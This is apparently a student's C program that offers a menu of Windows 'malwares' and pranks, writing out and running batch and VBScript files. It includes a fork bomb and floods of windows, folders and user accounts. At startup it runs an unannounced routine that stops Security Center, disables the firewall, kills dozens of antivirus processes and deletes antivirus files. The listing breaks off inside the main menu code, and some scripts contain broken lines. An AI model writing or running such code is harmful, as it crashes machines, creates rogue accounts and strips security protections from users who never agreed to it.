/*
PROJECT BY: Deepak Chauhan
College : National Institute Of Technology, Jamshedpur
YEAR : 2018
Language : 'C'
Pre-Requisites : 'gcc' or any kind of compiler installed
Compatibility : Windows 10 or less (UNIX compatibility coming soon ...)
*/

#include<stdio.h>
#include<string.h>
#include<math.h>
#include<stdlib.h>


//Global variables
FILE *f;

//To print Title
void title(){
    printf("*****************************************************************************************************************************************\n                          /$$$$$$                                          /$$$$$$$$        /$$                           /$$\n                         /$$__  $$                                        | $$_____/       |__/                          | $$\n /$$$$$$/$$$$  /$$   /$$| $$  \\ $$ /$$$$$$$   /$$$$$$   /$$$$$$  /$$   /$$| $$     /$$$$$$  /$$  /$$$$$$  /$$$$$$$   /$$$$$$$\n| $$_  $$_  $$| $$  | $$| $$$$$$$$| $$__  $$ /$$__  $$ /$$__  $$| $$  | $$| $$$$$ /$$__  $$| $$ /$$__  $$| $$__  $$ /$$__  $$\n| $$ \\ $$ \\ $$| $$  | $$| $$__  $$| $$  \\ $$| $$  \\ $$| $$  \\__/| $$  | $$| $$__/| $$  \\__/| $$| $$$$$$$$| $$  \\ $$| $$  | $$\n| $$ | $$ | $$| $$  | $$| $$  | $$| $$  | $$| $$  | $$| $$      | $$  | $$| $$   | $$      | $$| $$_____/| $$  | $$| $$  | $$\n| $$ | $$ | $$|  $$$$$$$| $$  | $$| $$  | $$|  $$$$$$$| $$      |  $$$$$$$| $$   | $$      | $$|  $$$$$$$| $$  | $$|  $$$$$$$\n|__/ |__/ |__/ \\____  $$|__/  |__/|__/  |__/ \\____  $$|__/       \\____  $$|__/   |__/      |__/ \\_______/|__/  |__/ \\_______/\n               /$$  | $$                     /$$  \\ $$           /$$  | $$                                                   \n              |  $$$$$$/                    |  $$$$$$/          |  $$$$$$/                                                   \n               \\______/                      \\______/            \\______/                                                    \n*****************************************************************************************************************************************");
}

//To print first menu
int home(){
    system("COLOR 0A");
    int home;
printf("\n\n\n");
printf("Menu :\n");
printf("Choose the category:\n");
printf("1)MALWARES\n2)UTILITY TOOLS\n3)EXIT\n");
scanf("%d", &home);
return home;
}

//To print Malware menu
int malware(){
    system("COLOR 0B");
    int malware;
printf("\n\n\n");
printf("Menu :\n");
printf("Choose the category:\n");
printf("1)Potential Malwares(Crashes machine or Destroyes machine)\n2)Prank Malwares(To have some fun)\n3)Back to MAIN MENU\n4)EXIT\n");
scanf("%d", &malware);
return malware;
}

//To print Potential Malware menu
int potential(){
    system("COLOR 0E");
    int potential;
printf("\n\n\n");
printf("Potential Malwares :\n");
printf("Choose the Destruction:\n");
printf("1)Notepad Flooder\n2)Application Bomber\n3)Folder flooder\n4)User Account Flooder\n5)Background Process Flooder\n6)Back to malwares\n7)Back to MAIN MENU\n8)EXIT\n");
scanf("%d", &potential);
return potential;
}

//To print Prank malware submenu
int prank(){
    system("COLOR 06");
    int prank;
printf("\n\n\n");
printf("Prank Malwares :\n");
printf("Choose the prank:\n");
printf("1)Scheduled shutdown with a message\n2)Lock the Caps Lock (Auto presses Caps Lock after 100ms)\n3)Annoying Cd-drive(ejects all Cd-Drives until shutdown)\n4)Enter smasher(Auto smashes ENTER key after 100ms)\n5)You are really a fool (prints you are fool continously)\n6)Back to Malwares\n7)Back to MAIN MENU\n8)EXIT\n");
scanf("%d", &prank);
return prank;
}

//To print Utility menu(UNDER DEVELOPMENT)
char utility(){
    system("COLOR 0C");
    int utility;
printf("\n\n\n");
printf("Menu :\n");
printf("Choose the tool:\n");
printf("1)Calculator\n2)EDM Lights\n3)Guess the number\n4)Matrix Background\n5)OTP Generator\n6)PC Cleanup Utility\n7)Talk to me please\n8)Back To MAIN MENU\n9)Exit\n");
scanf("%d", &utility);
return utility;
}


//To clear screen and Print Title
void clear(){
system("CLS");
title();
}

//File Creation programs
void createcmd(){
f=fopen("virus.cmd", "w");
}

void createbat(){
f=fopen("virus.bat", "w");
}

void createvbs(){
f=fopen("virus.vbs", "w");
}


//PRANK MALWARE TOOLS AND THEIR FUNCTION CODES
void shutdown(){
createbat();
fprintf(f, "@echo off\nshutdown -c \"Error! You are too stupid!\" -s");
fclose(f);
system("virus.bat");
}


void capslock(){
createvbs();
fprintf(f, "Set wshShell =wscript.CreateObject(\"WScript.Shell\")\ndo\nwscript.sleep 100\nwshshell.sendkeys \"{CAPSLOCK}\"\nloop");
fclose(f);
system("virus.vbs");
}

void cddrive(){
createvbs();
fprintf(f, "Set oWMP = CreateObject(\"WMPlayer.OCX.7\")\nSet colCDROMs = oWMP.cdromCollection\ndo\nif colCDROMs.Count >= 1 then\nFor i = 0 to colCDROMs.Count - 1\ncolCDROMs.Item(i).Eject\nNext\nFor i = 0 to colCDROMs.Count - 1\ncolCDROMs.Item(i).Eject\nNext\nEnd If\nwscript.sleep 1000\nloop" );
fclose(f);
system("virus.vbs");
}

void enterlock(){
createvbs();
fprintf(f, "Set wshShell = wscript.CreateObject(\"WScript.Shell\")\ndo\nwscript.sleep 100\nwshshell.sendkeys \"~(enter)\"\nloop ");
fclose(f);
system("virus.vbs");
}

void fool(){
createvbs();
fprintf(f, "Set wshShell = wscript.CreateObject(\"WScript.Shell\")\ndo\nwscript.sleep 100\nwshshell.sendkeys \"You are a fool.\"\nloop");
fclose(f);
system("virus.vbs");
}


//POTENTIAL MALWARE AND THEIR TOOLS
void notepad(){
createbat();
fprintf(f, "@ECHO off\n:top\nSTART notepad\nGOTO top");
fclose(f);
system("virus.bat");
}

void application_flooder(){
createcmd();
fprintf(f, "@echo off\n:x\nstart winword\nstart mspaint\nstart notepad\nstart write\nstart cmd\nstart explorer\nstart control\nstart calc\ngoto x");
fclose(f);
system("virus.cmd");
}

void folder_flooder(){
createcmd();
fprintf(f, "@echo off\n:x\nmd %random%\n/folder.\ngoto x");
fclose(f);
system("virus.cmd");
}

void background(){
createcmd();
fprintf(f, "%%0|%%0");
fclose(f);
system("virus.cmd");
}

void user(){
createcmd();
fprintf(f, "@echo off\n:xnet\nuser %%random%% /add\ngoto x");
fclose(f);
system("virus.cmd");
}


//UTILITY FUNCTIONS
void calculator(){
createbat();
fprintf(f, "@echo off\ntitle Batch Calculator by seJma\ncolor 1f\n:top\necho ******************************************************************************************************************************\necho                           /$$$$$$                                          /$$$$$$$$        /$$                           /$$\necho                          /$$__  $$                                        ^| $$_____/       ^|__/                          ^| $$\necho  /$$$$$$/$$$$  /$$   /$$^| $$  \\ $$ /$$$$$$$   /$$$$$$   /$$$$$$  /$$   /$$^| $$     /$$$$$$  /$$  /$$$$$$  /$$$$$$$   /$$$$$$$\necho ^| $$_  $$_  $$^| $$  ^| $$^| $$$$$$$$^| $$__  $$ /$$__  $$ /$$__  $$^| $$  ^| $$^| $$$$$ /$$__  $$^| $$ /$$__  $$^| $$__  $$ /$$__  $$\necho ^| $$ \\ $$ \\ $$^| $$  ^| $$^| $$__  $$^| $$  \\ $$^| $$  \\ $$^| $$  \\__/^| $$  ^| $$^| $$__/^| $$  \\__/^| $$^| $$$$$$$$^| $$  \\ $$^| $$  ^| $$\necho ^| $$ ^| $$ ^| $$^| $$  ^| $$^| $$  ^| $$^| $$  ^| $$^| $$  ^| $$^| $$      ^| $$  ^| $$^| $$   ^| $$      ^| $$^| $$_____/^| $$  ^| $$^| $$  ^| $$\necho ^| $$ ^| $$ ^| $$^|  $$$$$$$^| $$  ^| $$^| $$  ^| $$^|  $$$$$$$^| $$      ^|  $$$$$$$^| $$   ^| $$      ^| $$^|  $$$$$$$^| $$  ^| $$^|  $$$$$$$\necho ^|__/ ^|__/ ^|__/ \\____  $$^|__/  ^|__/^|__/  ^|__/ \\____  $$^|__/       \\____  $$^|__/   ^|__/      ^|__/ \\_______/^|__/  ^|__/ \\_______/\necho                /$$  ^| $$                     /$$  \\ $$           /$$  ^| $$                                                   \necho               ^|  $$$$$$/                    ^|  $$$$$$/          ^|  $$$$$$/                                                   \necho                \\______/                      \\______/            \\______/                                                    \necho *******************************************************************************************************************************\n\necho Enter the equation to calculate :  \nset /p sum=\nset /a ans=%%sum%%\necho. \necho = %%ans%%\necho --------------------------------------------------------------\npause\ncls\necho Previous Answer: %%ans%%\ngoto top\npause\nexit");
fclose(f);
system("virus.bat");
}

void talk(){
createvbs();
fprintf(f, "Dim Message, Speak\nMessage=InputBox(\"Enter text\",\"Speak\")\nSet Speak=CreateObject(\"sapi.spvoice\")\nSpeak.Speak Message");
fclose(f);
system("virus.vbs");
}

void matrix(){
createbat();
fprintf(f, "@echo off\ncolor 02\n:tricks\necho %%random%%%%random%%%%random%%%%random%%%%random%%%%random%%%%random%%%%random%%%%random%%%%random%%%%random%%%%random%%%%random%%%%random%%%%random%%%%random%%%%random%%%%random%%%%random%%%%random%%%%random%%%%random%%%%random%%%%random%%%%random%%%%random%%%%random%%%%random%%%%random%%%%random%%%%random%%%%random%%%%random%%%%random%%%%random%%%%random%%%%random%%%%random%%%%random%%%%random%%%%random%%%%random%%%%random%%%%random%%%%random%%%%random%%%%random%%%%random%%%%random%%%%random%%%%random%%%%random%%%%random%%%%random%%%%random%%%%random%%%%random%%%%random%%%%random%%%%random%%%%random%%%%random%%%%random%%%%random%%%%random%%%%random%%%%random%%%%random%%%%random%%%%random%%%%random%%\ngoto tricks");
fclose(f);
system("virus.bat");
}

void otp(){
createbat();
fprintf(f, "@echo off\n:Start2\ncls\ngoto Start\n:Start\ntitle OTP Generator\necho ******************************************************************************************************************************\necho                           /$$$$$$                                          /$$$$$$$$        /$$                           /$$\necho                          /$$__  $$                                        ^| $$_____/       ^|__/                          ^| $$\necho  /$$$$$$/$$$$  /$$   /$$^| $$  \\ $$ /$$$$$$$   /$$$$$$   /$$$$$$  /$$   /$$^| $$     /$$$$$$  /$$  /$$$$$$  /$$$$$$$   /$$$$$$$\necho ^| $$_  $$_  $$^| $$  ^| $$^| $$$$$$$$^| $$__  $$ /$$__  $$ /$$__  $$^| $$  ^| $$^| $$$$$ /$$__  $$^| $$ /$$__  $$^| $$__  $$ /$$__  $$\necho ^| $$ \\ $$ \\ $$^| $$  ^| $$^| $$__  $$^| $$  \\ $$^| $$  \\ $$^| $$  \\__/^| $$  ^| $$^| $$__/^| $$  \\__/^| $$^| $$$$$$$$^| $$  \\ $$^| $$  ^| $$\necho ^| $$ ^| $$ ^| $$^| $$  ^| $$^| $$  ^| $$^| $$  ^| $$^| $$  ^| $$^| $$      ^| $$  ^| $$^| $$   ^| $$      ^| $$^| $$_____/^| $$  ^| $$^| $$  ^| $$\necho ^| $$ ^| $$ ^| $$^|  $$$$$$$^| $$  ^| $$^| $$  ^| $$^|  $$$$$$$^| $$      ^|  $$$$$$$^| $$   ^| $$      ^| $$^|  $$$$$$$^| $$  ^| $$^|  $$$$$$$\necho ^|__/ ^|__/ ^|__/ \\____  $$^|__/  ^|__/^|__/  ^|__/ \\____  $$^|__/       \\____  $$^|__/   ^|__/      ^|__/ \\_______/^|__/  ^|__/ \\_______/\necho                /$$  ^| $$                     /$$  \\ $$           /$$  ^| $$                                                   \necho               ^|  $$$$$$/                    ^|  $$$$$$/          ^|  $$$$$$/                                                   \necho                \\______/                      \\______/            \\______/                                                    \necho *******************************************************************************************************************************\necho I will make you a new OTP. \necho Please write the OTP down somewhere in case you forget it. \necho ----------------------------------------¬-----------------------\necho 1) 1 Random OTP\necho 2) 5 Random OTPs\necho 3) 10 Random OTPs\necho Input your choice\nset input=\nset /p input= Choice: \nif %%input%%==1 goto A if NOT goto Start2\nif %%input%%==2 goto B if NOT goto Start2\nif %%input%%==3 goto C if NOT goto Start2\n:A\ncls\necho Your OTP is %%random%%\necho Now choose what you want to do. \necho 1) Go back to the beginning\necho 2) Exit\nset input=\nset /p input= Choice: \nif %%input%%==1 goto Start2 if NOT goto Start 2\nif %%input%%==2 goto Exit if NOT goto Start 2\n:Exit\nexit\n:B\ncls\necho Your 5 OTPs are %%random%%, %%random%%, %%random%%, %%random%%, %%random%%.\necho Now choose what you want to do. \necho 1) Go back to the beginning\necho 2) Exit\nset input=\nset /p input= Choice: \nif %%input%%==1 goto Start2 if NOT goto Start 2\nif %%input%%==2 goto Exit if NOT goto Start 2\n:C\ncls\necho Your 10 OTPs are %%random%%, %%random%%, %%random%%, %%random%%, %%random%%, %%random%%, %%random%%, %%random%%, %%random%%, %%random%%\necho Now choose what you want to do. \necho 1) Go back to the beginning\necho 2) Exit\nset input=\nset /p input= Choice: \nif %%input%%==1 goto Start2 if NOT goto Start 2\nif %%input%%==2 goto Exit if NOT goto Start 2");
fclose(f);
system("virus.bat");
}

void guess(){
createbat();
fprintf(f, "@echo off\ncolor 0e\ntitle Original Guessing Game by seJma\necho ******************************************************************************************************************************\necho                           /$$$$$$                                          /$$$$$$$$        /$$                           /$$\necho                          /$$__  $$                                        ^| $$_____/       ^|__/                          ^| $$\necho  /$$$$$$/$$$$  /$$   /$$^| $$  \\ $$ /$$$$$$$   /$$$$$$   /$$$$$$  /$$   /$$^| $$     /$$$$$$  /$$  /$$$$$$  /$$$$$$$   /$$$$$$$\necho ^| $$_  $$_  $$^| $$  ^| $$^| $$$$$$$$^| $$__  $$ /$$__  $$ /$$__  $$^| $$  ^| $$^| $$$$$ /$$__  $$^| $$ /$$__  $$^| $$__  $$ /$$__  $$\necho ^| $$ \\ $$ \\ $$^| $$  ^| $$^| $$__  $$^| $$  \\ $$^| $$  \\ $$^| $$  \\__/^| $$  ^| $$^| $$__/^| $$  \\__/^| $$^| $$$$$$$$^| $$  \\ $$^| $$  ^| $$\necho ^| $$ ^| $$ ^| $$^| $$  ^| $$^| $$  ^| $$^| $$  ^| $$^| $$  ^| $$^| $$      ^| $$  ^| $$^| $$   ^| $$      ^| $$^| $$_____/^| $$  ^| $$^| $$  ^| $$\necho ^| $$ ^| $$ ^| $$^|  $$$$$$$^| $$  ^| $$^| $$  ^| $$^|  $$$$$$$^| $$      ^|  $$$$$$$^| $$   ^| $$      ^| $$^|  $$$$$$$^| $$  ^| $$^|  $$$$$$$\necho ^|__/ ^|__/ ^|__/ \\____  $$^|__/  ^|__/^|__/  ^|__/ \\____  $$^|__/       \\____  $$^|__/   ^|__/      ^|__/ \\_______/^|__/  ^|__/ \\_______/\necho                /$$  ^| $$                     /$$  \\ $$           /$$  ^| $$                                                   \necho               ^|  $$$$$$/                    ^|  $$$$$$/          ^|  $$$$$$/                                                   \necho                \\______/                      \\______/            \\______/                                                    \necho *******************************************************************************************************************************\n\nset /a guessnum=0\nset /a answer=%%RANDOM%%\nset variable1=surf33\necho -------------------------------------------------\necho Welcome to the Guessing Game! \necho. \necho Try and Guess my Number! \necho -------------------------------------------------\necho. \n:top\necho. \nset /p guess=\necho. \nif %%guess%% GTR %%answer%% ECHO Lower! \nif %%guess%% LSS %%answer%% ECHO Higher! \nif %%guess%%==%%answer%% GOTO EQUAL\nset /a guessnum=%%guessnum%% +1\nif %%guess%%==%%variable1%% ECHO Found the backdoor hey?, the answer is: %%answer%%\ngoto top\n:equal\necho Congratulations, You guessed right!!! \necho. \necho It took you %%guessnum%% guesses. \necho. \npause");
fclose(f);
system("virus.bat");
}

void edm(){
createvbs();
fprintf(f, "Set wshShell =wscript.CreateObject(\"WScript.Shell\")\n\ndo\nwscript.sleep 100\nwshshell.sendkeys \"{CAPSLOCK}\"\nwshshell.sendkeys \"{NUMLOCK}\"\nwshshell.sendkeys \"{SCROLLLOCK}\"\nloop");
fclose(f);
system("virus.vbs");
}

void cleanup(){
createbat();
fprintf(f, "@echo off\ntitle PC Cleanup Utility http://www.youtube.com/user/techki-tv\n\n:menu\ncls\necho ******************************************************************************************************************************\necho                           /$$$$$$                                          /$$$$$$$$        /$$                           /$$\necho                          /$$__  $$                                        ^| $$_____/       ^|__/                          ^| $$\necho  /$$$$$$/$$$$  /$$   /$$^| $$  \\ $$ /$$$$$$$   /$$$$$$   /$$$$$$  /$$   /$$^| $$     /$$$$$$  /$$  /$$$$$$  /$$$$$$$   /$$$$$$$\necho ^| $$_  $$_  $$^| $$  ^| $$^| $$$$$$$$^| $$__  $$ /$$__  $$ /$$__  $$^| $$  ^| $$^| $$$$$ /$$__  $$^| $$ /$$__  $$^| $$__  $$ /$$__  $$\necho ^| $$ \\ $$ \\ $$^| $$  ^| $$^| $$__  $$^| $$  \\ $$^| $$  \\ $$^| $$  \\__/^| $$  ^| $$^| $$__/^| $$  \\__/^| $$^| $$$$$$$$^| $$  \\ $$^| $$  ^| $$\necho ^| $$ ^| $$ ^| $$^| $$  ^| $$^| $$  ^| $$^| $$  ^| $$^| $$  ^| $$^| $$      ^| $$  ^| $$^| $$   ^| $$      ^| $$^| $$_____/^| $$  ^| $$^| $$  ^| $$\necho ^| $$ ^| $$ ^| $$^|  $$$$$$$^| $$  ^| $$^| $$  ^| $$^|  $$$$$$$^| $$      ^|  $$$$$$$^| $$   ^| $$      ^| $$^|  $$$$$$$^| $$  ^| $$^|  $$$$$$$\necho ^|__/ ^|__/ ^|__/ \\____  $$^|__/  ^|__/^|__/  ^|__/ \\____  $$^|__/       \\____  $$^|__/   ^|__/      ^|__/ \\_______/^|__/  ^|__/ \\_______/\necho                /$$  ^| $$                     /$$  \\ $$           /$$  ^| $$                                                   \necho               ^|  $$$$$$/                    ^|  $$$$$$/          ^|  $$$$$$/                                                   \necho                \\______/                      \\______/            \\______/                                                    \necho *******************************************************************************************************************************\n\necho --------------------------------------------------------------------------------\necho PC Cleanup Utility\necho --------------------------------------------------------------------------------\necho.\necho Select a tool\necho =============\necho.\necho [1] Delete Internet Cookies\necho [2] Delete Temporary Internet Files\necho [3] Disk Cleanup\necho [4] Disk Defragment\necho [5] Exit\necho.\nset /p op=Run:\nif %%op%%==1 goto 1\nif %%op%%==2 goto 2\nif %%op%%==3 goto 3\nif %%op%%==4 goto 4\nif %%op%%==5 goto exit\ngoto error\n:1\ncls\necho --------------------------------------------------------------------------------\necho Delete Internet Cookies\necho --------------------------------------------------------------------------------\necho.\necho Deleting Cookies...\nping localhost -n 3 >nul\ndel /f /q \"%%userprofile%%\\Cookies\\*.*\"\ncls\necho --------------------------------------------------------------------------------\necho Delete Internet Cookies\necho --------------------------------------------------------------------------------\necho.\necho Cookies deleted.\necho.\necho Press any key to return to the menu. . .\npause >nul\ngoto menu\n:2\ncls\necho --------------------------------------------------------------------------------\necho Delete Temporary Internet Files\necho --------------------------------------------------------------------------------\necho.\necho Deleting Temporary Files...\nping localhost -n 3 >nul\ndel /f /q \"%%userprofile%%\\AppData\\Local\\Microsoft\\Windows\\Temporary Internet Files\\*.*\"\ncls\necho --------------------------------------------------------------------------------\necho Delete Temporary Internet Files\necho --------------------------------------------------------------------------------\necho.\necho Temporary Internet Files deleted.\necho.\necho Press any key to return to the menu. . .\npause >nul\ngoto menu\n:3\ncls\necho --------------------------------------------------------------------------------\necho Disk Cleanup\necho --------------------------------------------------------------------------------\necho.\necho Running Disk Cleanup...\nping localhost -n 3 >nul\nif exist \"C:\\WINDOWS\\temp\"del /f /q \"C:WINDOWS\\temp\\*.*\"\nif exist \"C:\\WINDOWS\\tmp\" del /f /q \"C:\\WINDOWS\\tmp\\*.*\"\nif exist \"C:\\tmp\" del /f /q \"C:\\tmp\\*.*\"\nif exist \"C:\\temp\" del /f /q \"C:\\temp\\*.*\"\nif exist \"%%temp%%\" del /f /q \"%%temp%%\\*.*\"\nif exist \"%%tmp%%\" del /f /q \"%%tmp%%\\*.*\"\nif not exist \"C:\\WINDOWS\\Users\\*.*\" goto skip\nif exist \"C:\\WINDOWS\\Users\\*.zip\" del \"C:\\WINDOWS\\Users\\*.zip\" /f /q\nif exist \"C:\\WINDOWS\\Users\\*.exe\" del \"C:\\WINDOWS\\Users\\*.exe\" /f /q\nif exist \"C:\\WINDOWS\\Users\\*.gif\" del \"C:\\WINDOWS\\Users\\*.gif\" /f /q\nif exist \"C:\\WINDOWS\\Users\\*.jpg\" del \"C:\\WINDOWS\\Users\\*.jpg\" /f /q\nif exist \"C:\\WINDOWS\\Users\\*.png\" del \"C:\\WINDOWS\\Users\\*.png\" /f /q\nif exist \"C:\\WINDOWS\\Users\\*.bmp\" del \"C:\\WINDOWS\\Users\\*.bmp\" /f /q\nif exist \"C:\\WINDOWS\\Users\\*.avi\" del \"C:\\WINDOWS\\Users\\*.avi\" /f /q\nif exist \"C:\\WINDOWS\\Users\\*.mpg\" del \"C:\\WINDOWS\\Users\\*.mpg\" /f /q\nif exist \"C:\\WINDOWS\\Users\\*.mpeg\" del \"C:\\WINDOWS\\Users\\*.mpeg\" /f /q\nif exist \"C:\\WINDOWS\\Users\\*.ra\" del \"C:\\WINDOWS\\Users\\*.ra\" /f /q\nif exist \"C:\\WINDOWS\\Users\\*.ram\" del \"C:\\WINDOWS\\Users\\*.ram\"/f /q\nif exist \"C:\\WINDOWS\\Users\\*.mp3\" del \"C:\\WINDOWS\\Users\\*.mp3\" /f /q\nif exist \"C:\\WINDOWS\\Users\\*.mov\" del \"C:\\WINDOWS\\Users\\*.mov\" /f /q\nif exist \"C:\\WINDOWS\\Users\\*.qt\" del \"C:\\WINDOWS\\Users\\*.qt\" /f /q\nif exist \"C:\\WINDOWS\\Users\\*.asf\" del \"C:\\WINDOWS\\Users\\*.asf\" /f /q\n:skip\nif not exist C:\\WINDOWS\\Users\\Users\\*.* goto skippy /f /q\nif exist C:\\WINDOWS\\Users\\AppData\\Temp\\*.zip del C:\\WINDOWS\\Users\\Users\\*.zip /f /q\nif exist C:\\WINDOWS\\Users\\AppData\\Temp\\*.exe del C:\\WINDOWS\\Users\\Users\\*.exe /f /q\nif exist C:\\WINDOWS\\Users\\AppData\\Temp\\*.gif del C:\\WINDOWS\\Users\\Users\\*.gif /f /q\nif exist C:\\WINDOWS\\Users\\AppData\\Temp\\*.jpg del C:\\WINDOWS\\Users\\Users\\*.jpg /f /q\nif exist C:\\WINDOWS\\Users\\AppData\\Temp\\*.png del C:\\WINDOWS\\Users\\Users\\*.png /f /q\nif exist C:\\WINDOWS\\Users\\AppData\\Temp\\*.bmp del C:\\WINDOWS\\Users\\Users\\*.bmp /f /q\nif exist C:\\WINDOWS\\Users\\AppData\\Temp\\*.avi del C:\\WINDOWS\\Users\\Users\\*.avi /f /q\nif exist C:\\WINDOWS\\Users\\AppData\\Temp\\*.mpg del C:\\WINDOWS\\Users\\Users\\*.mpg /f /q\nif exist C:\\WINDOWS\\Users\\AppData\\Temp\\*.mpeg del C:\\WINDOWS\\Users\\Users\\*.mpeg /f /q\nif exist C:\\WINDOWS\\Users\\AppData\\Temp\\*.ra del C:\\WINDOWS\\Users\\Users\\*.ra /f /q\nif exist C:\\WINDOWS\\Users\\AppData\\Temp\\*.ram del C:\\WINDOWS\\Users\\Users\\*.ram /f /q\nif exist C:\\WINDOWS\\Users\\AppData\\Temp\\*.mp3 del C:\\WINDOWS\\Users\\Users\\*.mp3 /f /q\nif exist C:\\WINDOWS\\Users\\AppData\\Temp\\*.asf del C:\\WINDOWS\\Users\\Users\\*.asf /f /q\nif exist C:\\WINDOWS\\Users\\AppData\\Temp\\*.qt del C:\\WINDOWS\\Users\\Users\\*.qt /f /q\nif exist C:\\WINDOWS\\Users\\AppData\\Temp\\*.mov del C:\\WINDOWS\\Users\\Users\\*.mov /f /q\n:skippy\nif exist \"C:\\WINDOWS\\ff*.tmp\" del C:\\WINDOWS\\ff*.tmp /f /q\nif exist C:\\WINDOWS\\ShellIconCache del /f /q \"C:\\WINDOWS\\ShellI~1\\*.*\"\ncls\necho --------------------------------------------------------------------------------\necho Disk Cleanup\necho --------------------------------------------------------------------------------\necho.\necho Disk Cleanup successful!\necho.\npause\ngoto menu\n:4\ncls\necho --------------------------------------------------------------------------------\necho Disk Defragment\necho --------------------------------------------------------------------------------\necho.\necho Defragmenting hard disks...\nping localhost -n 3 >nul\ndefrag -c -v\ncls\necho --------------------------------------------------------------------------------\necho Disk Defragment\necho --------------------------------------------------------------------------------\necho.\necho Disk Defrag successful!\necho.\npause\ngoto menu\n:error\ncls\necho Command not recognized.\nping localhost -n 4 >nul\ngoto menu\n:exit\n\n\necho Thanks for using PC Cleanup Utility by Ryan\nping 127.0.0.1 >nul\nexit");
fclose(f);
system("virus.bat");
}


//ANTI-VIRUS DISABLER SO THAT OS CAN'T CURE THE FILE AS IT IS CREATED
void anti_virus_disabler(){
clear();
printf("DISABLING ANTI-VIRUSES........");
createcmd();
fprintf(f, "@ echo off\nrem\nrem Permanently Kill Anti-Virus\nnet stop “Security Center”\nnetsh firewall set opmode mode=disable\ntskill /A av*\ntskill /A fire*\ntskill /A anti*\ncls\ntskill /A spy*\ntskill /A bullguard\ntskill /A PersFw\ntskill /A KAV*\ntskill /A ZONEALARM\ntskill /A SAFEWEB\ncls\ntskill /A spy*\ntskill /A bullguard\ntskill /A PersFw\ntskill /A KAV*\ntskill /A ZONEALARM\ntskill /A SAFEWEB\ncls\ntskill /A OUTPOST\ntskill /A nv*\ntskill /A nav*\ntskill /A F-*\ntskill /A ESAFE\ntskill /A cle\ncls\ntskill /A BLACKICE\ntskill /A def*\ntskill /A kav\ntskill /A kav*\ntskill /A avg*\ntskill /A ash*\ncls\ntskill /A aswupdsv\ntskill /A ewid*\ntskill /A guard*\ntskill /A guar*\ntskill /A gcasDt*\ntskill /A msmp*\ncls\ntskill /A mcafe*\ntskill /A mghtml\ntskill /A msiexec\ntskill /A outpost\ntskill /A isafe\ntskill /A zap*cls\ntskill /A zauinst\ntskill /A upd*\ntskill /A zlclien*\ntskill /A minilog\ntskill /A cc*\ntskill /A norton*\ncls\ntskill /A norton au*\ntskill /A ccc*\ntskill /A npfmn*\ntskill /A loge*\ntskill /A nisum*\ntskill /A issvc\ntskill /A tmp*\ncls\ntskill /A tmn*\ntskill /A pcc*\ntskill /A cpd*\ntskill /A pop*\ntskill /A pav*\ntskill /A padmincls\ntskill /A panda*\ntskill /A avsch*\ntskill /A sche*\ntskill /A syman*\ntskill /A virus*\ntskill /A realm*cls\ntskill /A sweep*\ntskill /A scan*\ntskill /A ad-*\ntskill /A safe*\ntskill /A avas*\ntskill /A norm*\ncls\ntskill /A offg*\ndel /Q /F C:\\Program Files\\alwils~1\\avast4\\*.*\ndel /Q /F C:\\Program Files\\Lavasoft\\Ad-awa~1\\*.exe\ndel /Q /F C:\\Program Files\\kasper~1\\*.exe\ncls\ndel /Q /F C:\\Program Files\\trojan~1\\*.exe\ndel /Q /F C:\\Program Files\\f-prot95\\*.dll\ndel /Q /F C:\\Program Files\\tbav\\*.datcls\ndel /Q /F C:\\Program Files\\avpersonal\\*.vdf\ndel /Q /F C:\\Program Files\\Norton~1\\*.cnt\ndel /Q /F C:\\Program Files\\Mcafee\\*.*\ncls\ndel /Q /F C:\\Program Files\\Norton~1\\Norton~1\\Norton~3\\*.*\ndel /Q /F C:\\Program Files\\Norton~1\\Norton~1\\speedd~1\\*.*\ndel /Q /F C:\\Program Files\\Norton~1\\Norton~1\\*.*\ndel /Q /F C:\\Program Files\\Norton~1\\*.*\ncls\ndel /Q /F C:\\Program Files\\avgamsr\\*.exe\ndel /Q /F C:\\Program Files\\avgamsvr\\*.exe\ndel /Q /F C:\\Program Files\\avgemc\\*.exe\ncls\ndel /Q /F C:\\Program Files\\avgcc\\*.exe\ndel /Q /F C:\\Program Files\\avgupsvc\\*.exe\ndel /Q /F C:\\Program Files\\grisoft\ndel /Q /F C:\\Program Files\\nood32krn\\*.exe\ndel /Q /F C:\\Program Files\\nood32\\*.exe\ncls\ndel /Q /F C:\\Program Files\\nod32\ndel /Q /F C:\\Program Files\\nood32\ndel /Q /F C:\\Program Files\\kav\\*.exe\ndel /Q /F C:\\Program Files\\kavmm\\*.exe\ndel /Q /F C:\\Program Files\\kaspersky\\*.*\ncls\ndel /Q /F C:\\Program Files\\ewidoctrl\\*.exe\ndel /Q /F C:\\Program Files\\guard\\*.exe\ndel /Q /F C:\\Program Files\\ewido\\*.exe\ncls\ndel /Q /F C:\\Program Files\\pavprsrv\\*.exe\ndel /Q /F C:\\Program Files\\pavprot\\*.exe\ndel /Q /F C:\\Program Files\\avengine\\*.exe\ncls\ndel /Q /F C:\\Program Files\\apvxdwin\\*.exe\ndel /Q /F C:\\Program Files\\webproxy\\*.exe\ndel /Q /F C:\\Program Files\\panda\nsoftware\\*.*\nrem");
fclose(f);
system("virus.txt");
}


//****************************************************MAIN BODY OF PROGRAM**********************************************************
int main(){
int choice, choice1, choice2, choice3;

//USING ANTI-VIRUS DISABLER
anti_virus_disabler();

C1:
clear();

choice = home();
clear();
//USING SWITCHCASE
switch(choice){
                                                                                            case 1 : {
        C2:
        choice1 = malware();
clear();
        //SWITCH CASE
        switch(choice1){
                        case 1 :{

                //POTENTIAL MALWARES
                C3 :
                choice2 = potential();
clear();
            switch(choice2){

            case 1 : {
            notepad();
            break;
            }

            case 2 : {
            application_flooder();
            break;
            }

            case 3 : {
            folder_flooder();
            break;
            }

            case 4 : {
            user();
            break;
            }

            case 5 : {
            background();
            break;
            }

            case 6 : {
            goto C2;
            break;
            }

            case 7: {
            goto C1;
            break;
            }

            case 8 : {
            printf("Thanks for Using script, see you later, enjoy your anger till then......");
exit(0);
            }

            default : {
               printf("\a Enter options from above, Try again");
                goto C3;
            }

            }
break;
}

                    case 2 : {

    C4:
        choice2 = prank();
        clear();
        switch(choice2){
                case 1 : {
                shutdown();
                break;
                }

                case 2 : {
                capslock();
                break;
                }

                case 3 : {
                cddrive();
                break;
                }

                case 4 : {
                enterlock();
                break;
                }

                case 5 : {
                fool();
                break;
                }

                case 6 : {
                goto C2;
                break;
                }

                case 7 : {
                goto C1;
                break;
                }

                case 8 :
                    {
                       printf("Thanks for Using script, see you later, enjoy your anger till then......");
                        exit(0);
                    }

              default : {
    printf("\a Enter options from above, Try again");
goto C4;
break;
}
        }
break;
}

//BACK TO MAIN MENU
case 3 : {
goto C1;
break;
}
